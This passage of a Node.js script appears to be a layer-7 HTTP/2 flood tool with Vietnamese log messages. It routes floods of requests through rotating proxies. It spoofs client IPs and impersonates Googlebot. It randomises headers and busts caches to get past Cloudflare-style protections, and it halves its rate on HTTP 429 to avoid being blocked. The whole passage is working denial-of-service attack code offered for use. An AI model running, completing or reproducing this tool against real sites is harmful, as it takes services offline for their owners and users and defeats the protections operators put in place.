        maprate = maprate.filter(limit => currentTime - limit.timestamp <= 15000);
    })();
    let proxy, proxyHost, proxyPort, proxyUsername, proxyPassword;
    do {
        const selectedProxy = proxyr();
        const proxyParts = selectedProxy.split(':');
        if (proxyParts.length === 2) {
            [proxyHost, proxyPort] = proxyParts;
            proxyUsername = null;
            proxyPassword = null;
        } else if (proxyParts.length === 4) {
            [proxyHost, proxyPort, proxyUsername, proxyPassword] = proxyParts;
        } else {
            continue;
        }
        proxy = { host: proxyHost, port: proxyPort, username: proxyUsername, password: proxyPassword };
    } while (maprate.some(limit => limit.proxy === proxy.host && (Date.now() - limit.timestamp) < 15000));

    const parseBoolean = (value) => value === "true";
    const getArgumentValue = (args, flag, defaultValue = null) => {
        const index = args.indexOf(flag);
        return index !== -1 ? args[index + 1] : defaultValue;
    };

    const bypassconnect = process.argv.slice(2);
    const ratelimit0 = parseBoolean(getArgumentValue(bypassconnect, '--ratelimit', "false"));
    const indexconnectio = parseInt(getArgumentValue(bypassconnect, '--connect', '1'));
    const method = getArgumentValue(process.argv.slice(7), '--method', 'GET').toUpperCase();
    const query = getArgumentValue(process.argv.slice(7), '--query', null);
    const xpushdata = parseBoolean(getArgumentValue(bypassconnect, '--write'));
    const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false));
    const cacheBypass = bypassconnect.includes('--cache');
    const refererGoogle = getArgumentValue(bypassconnect, '--referer', null) === 'google';
    const useGooglebot = bypassconnect.includes('--googlebot');
    nodeii = getRandomInt(120, 130);

    async function reswritedata(req) {
        const buffer = Buffer.alloc(16 * 1024);
        const data = Buffer.from([0x62, 0x69, 0x6e, 0x61, 0x72, 0x79, 0x20, 0x64, 0x61, 0x74, 0x61]);
        data.copy(buffer);
        await req.write(buffer);
    }

    let uaa;
    if (useGooglebot) {
        uaa = `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/128.0.6613.138 Safari/537.36 `;
    } else {
        const uaValue = getArgumentValue(process.argv.slice(2), '--ua', 'false');
        if (uaValue === 'true') {
            uaa = generateRandomLongString();
        } else if (uaValue !== 'false') {
            uaa = uaValue;
        } else {
            const uap = [
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(100, 130)}.0.0.0 Safari/537.36`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(100, 130)}.0.0.0 Mobile Safari/537.36`,
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${getRandomInt(100, 130)}.0) Gecko/20100101 Firefox/${getRandomInt(100, 130)}.0`,
                `Mozilla/5.0 (Linux; Android ${getRandomInt(10, 13)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(100, 130)}.0.0.0 Mobile Safari/537.36`,
                `Mozilla/5.0 (Linux; Android ${getRandomInt(10, 13)}; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(100, 130)}.0.0.0 Mobile Safari/537.36`,
                `Mozilla/5.0 (iPhone; CPU iPhone OS ${getRandomInt(15, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(15, 17)}.0 Mobile/15E148 Safari/604.1`,
                `Mozilla/5.0 (iPad; CPU OS ${getRandomInt(15, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(15, 17)}.0 Mobile/15E148 Safari/604.1`
            ];
            uaa = uap[Math.floor(Math.random() * uap.length)];
        }
    }

    let path = parsed.pathname;
    const args = process.argv.slice(2);
    if (parsed.pathname.includes('%RAND%')) {
        path = parsed.pathname.replace("%RAND%", generateRandomString(5, 7));
    }
    if (cacheBypass) {
        path = parsed.pathname + "?cache_bust=" + Date.now();
    }

    let header = {
        "priority": headerFunc.priority(),
        "Accept-Language": headerFunc.language(),
        "sec-fetch-dest": headerFunc.fetchDest(),
        "sec-fetch-user": "?1",
        "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "cdn-loop": "cloudflare; loops=1",
        "sec-fetch-mode": headerFunc.fetchMode(),
        "sec-fetch-site": headerFunc.fetchSite(),
        "upgrade-insecure-requests": "1",
        "User-Agent": uaa,
        "Accept": headerFunc.accept(),
        "Cache-Control": headerFunc.cache(),
        "Pragma": "no-cache",
        "Expires": "0",
        "Accept-Encoding": headerFunc.encoding(),
        "sec-ch-ua": headerFunc.secChUa(),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-full-version": `"${getRandomInt(100, 130)}.0.0.0"`,
        "sec-ch-ua-arch": ["x86", "x64"][Math.floor(Math.random() * 2)],
        "sec-ch-ua-platform": headerFunc.platform(),
        "sec-ch-ua-platform-version": `"${getRandomInt(10, 15)}.${getRandomInt(0, 9)}.${getRandomInt(0, 9)}"`,
        "sec-ch-ua-model": `""`,
        "sec-ch-ua-bitness": ["64", "32"][Math.floor(Math.random() * 2)],
        "sec-ch-ua-full-version-list": headerFunc.secChUa(),
        ...(refererGoogle ? { "Referer": "https://www.google.com/" } : Math.random() < 0.4 ? { "Referer": headerFunc.referrer() } : {}),
        ...shuffleObject({
            ...(Math.random() < 0.6 ? { "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` } : {}),
            ...(Math.random() < 0.6 ? { "Origin": parsed.protocol + '//' + parsed.hostname } : {}),
            ...(Math.random() < 0.6 ? { "X-Requested-With": "XMLHttpRequest" } : {}),
            ...(Math.random() < 0.6 ? { "Via": `1.1 ${generateRandomString(5,10)}.proxy.com` } : {}),
            ...(Math.random() < 0.4 ? { [headerFunc.customHeader()]: generateRandomString(1, 5) } : {}),
            ...(Math.random() < 0.4 ? { "Content-Type": headerFunc.contentType() } : {})
        })
    };

    if (cookie) {
        header["cookie"] = cookie;
    }

    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.5 ? { ["c-xjava-xjs" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5) } : {}),
            ...(Math.random() < 0.5 ? { "blum-purpose": "0" } : {}),
            ...(Math.random() < 0.5 ? { "blum-point": "0" } : {}),
        };
    }

    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
        };
    }

    const datafloor = Math.floor(Math.random() * 3);
    let mathfloor;
    let rada;
    switch (datafloor) {
        case 0:
            mathfloor = 6291456 + 65535;
            rada = 128;
            break;
        case 1:
            mathfloor = 6291456 - 65535;
            rada = 256;
            break;
        case 2:
            mathfloor = 6291456 + 65535 * 4;
            rada = 1;
            break;
    }

    const TLSOPTION = {
        ciphers: headerFunc.cipher(),
        sigalgs: sigals,
        minVersion: "TLSv1.3",
        ecdhCurve: 'secp256r1:X25519',
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h3', 'h2', 'http/1.1', 'hÃ¥Â½Â±Ã§ÂÂ', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
        requestOCSP: true,
        minDHSize: 2048
    };

    async function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = await tls.connect({
            ...TLSOPTION,
            host: parsed.hostname,
            port: 443,
            servername: parsed.hostname,
            socket: socket
        });
        return tlsSocket;
    }

    const closeConnections = (client, connection, tlsSocket, socket, threaf) => {
        if (client) client.destroy();
        if (socket) socket.end();
        if (connection) connection.destroy();
        if (tlsSocket) tlsSocket.end();
        if (threaf) clearInterval(threaf);
    };

    let procxy = [];
    for (let o = 0; o < indexconnectio; o++) {
        const agent = await new http.Agent({
            host: proxy.host,
            port: proxy.port,
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.hostname + ':443',
            timeout: 5000,
            headers: {
                'Host': parsed.hostname,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'close',
                ...(proxy.username && proxy.password ? {
                    'Proxy-Authorization': `Basic ${Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64')}`
                } : {})
            },
        };
        connection = await http.request(Optionsreq, (res) => {});
        connection.on('error', (err) => {
            if (err) connection.destroy();
            return;
        });
        connection.on('timeout', async () => {
            return;
        });
        procxy.push(connection);
    }

    procxy.forEach((connection, index) => {
        connection.on('connect', async function(res, socket) {
            socket.setKeepAlive(true, 5000);
            const tlsSocket = await createCustomTLSSocket(parsed, socket);

            const client = await http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    enablePush: true,
                    enableConnectProtocol: false,
                    enableOrigin: true,
                    enableH2cUpgrade: true,
                    allowHTTP1: true,
                    ...(Math.random() < 0.5 ? { maxConcurrentStreams: 100 } : {}),
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 262144,
                }
            }, (session) => {
                session.setLocalWindowSize(mathfloor);
            });

            client.on("error", (error) => {
                if (error) closeConnections(client, connection, tlsSocket, socket);
            });

            client.on("close", () => {
                closeConnections();
            });

            client.on("connect", async () => {
                threaf = setInterval(async () => {
                    for (let i = 0; i < rps; i++) {
                        const validMethods = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "DELETE", "TRACE", "CONNECT", "PATCH"];
                        if (!validMethods.includes(method)) {
                            console.error(`[ERROR] Invalid method "${method}". Use: ${validMethods.join(', ')}`.bgRed);
                            process.exit(1);
                        }
                        const selectedMethod = method;
                        let author = {
                            ":method": selectedMethod,
                            ...(selectedMethod === "POST" || selectedMethod === "PUT" || selectedMethod === "PATCH" ? { "content-length": "0" } : {}),
                            ":authority": parsed.hostname,
                            ":scheme": "https",
                            ":path": query === 'path' ?
                                path + '/' + generateRandomString(20, 50) + fileExtensions[Math.floor(Math.random() * fileExtensions.length)] + '?q=' + generateRandomString(20, 50) :
                                query === 'string' ?
                                path + '?s=' + generateRandomString(20, 50) :
                                path,
                        };

                        const head = header;
                        const request = await client.request({ ...author, ...head }, {
                            ...(xpushdata === true ? { endStream: false } : {}),
                            weight: rada,
                            parent: 0,
                            exclusive: false
                        });

                        switch (tos) {
                            case "true":
                                request.on('response', (res) => {
                                    response(res);
                                    if (ratelimit0 === true && res[":status"] === 429) {
                                        maprate.push({ proxy: proxy.host, timestamp: Date.now() });
                                        currentRps = Math.max(1, Math.floor(currentRps / 2));
                                        rps = currentRps;
                                        client.destroy();
                                        return;
                                    }

                                    if (res["set-cookie"]) {
                                        const filteredCookies = res["set-cookie"].map(cookie => {
                                            return cookie.split(';')[0];
                                        });
                                        head["cookie"] = filteredCookies.join("; ");
                                    }

                                    if (redirect === true) {
                                        if (res["location"]) {
                                            parsed = new URL(res["location"]);
                                        }
                                    }
                                }).end();
                                let responseData = '';
                                request.on('data', (chunk) => {
                                    responseData += chunk.toString();
                                    if (responseData.includes('cookie')) {
                                        head["cookie"] = responseData.split('cookie="')[1].split(';')[0];
                                        if (!head["cookie"]) {
                                            head["cookie"] = responseData.split('cookie = "')[1].split(';')[0];
                                        }
                                    }
                                    if (head["cookie"].includes("=bl")) {
                                        head["cookie"] = "";
                                    }
                                }).end();
                                break;
                            default:
                                request.on('response', (res) => {
                                    if (ratelimit0 === true && res[":status"] === 429) {
                                        maprate.push({ proxy: proxy.host, timestamp: Date.now() });
                                        currentRps = Math.max(1, Math.floor(currentRps / 2));
                                        rps = currentRps;
                                        client.destroy();
                                        return;
                                    }
                                    if (res["set-cookie"]) {
                                        const filteredCookies = res["set-cookie"].map(cookie => {
                                            return cookie.split(';')[0];
                                        });
                                        head["cookie"] = filteredCookies.join("; ");
                                    }
                                    if (redirect === true) {
                                        if (res["location"]) {
                                            parsed = new URL(res["location"]);
                                        }
                                    }
                                }).end();
                                break;
                        }

                        if (xpushdata === true) reswritedata(request);
                        request.priority({
                            weight: rada,
                            parent: 0,
                            exclusive: false
                        });
                        request.end();
                    }
                }, interval);
            }).on("error", (err) => {
                if (err) closeConnections(client, connection, tlsSocket, socket);
            });
            client.on("close", () => {
                closeConnections(client, connection, tlsSocket, socket);
            });
        });
        connection.end();
    });
}

function reloadProxies() {
    try {
        const proxyData = fs.readFileSync(proxyFile, 'utf-8');
        const newProxies = proxyData.match(/\S+/g) || [];
        const validProxies = [...new Set(newProxies)].filter(proxy => isValidProxy(proxy));
        if (validProxies.length === 0) {
            console.error(`[${new Date().toLocaleTimeString()}] Không tìm thấy proxy hợp lệ trong ${proxyFile}`.yellow);
            return;
        }
        proxys = shuffleArray(validProxies);
        totalProxies = proxys.length;
        console.log(`[${new Date().toLocaleTimeString()}] Đã cập nhật danh sách proxy từ ${proxyFile}: ${totalProxies} proxy hợp lệ`.green);
    } catch (err) {
        console.error(`[${new Date().toLocaleTimeString()}] Lỗi đọc file proxy ${proxyFile}: ${err.message}`.red);
    }
}

// Tải proxy ban đầu
reloadProxies();

// Lên lịch cập nhật proxy mỗi 5 giây trong master process
if (cluster.isMaster) {
    setInterval(reloadProxies, 5000);
}
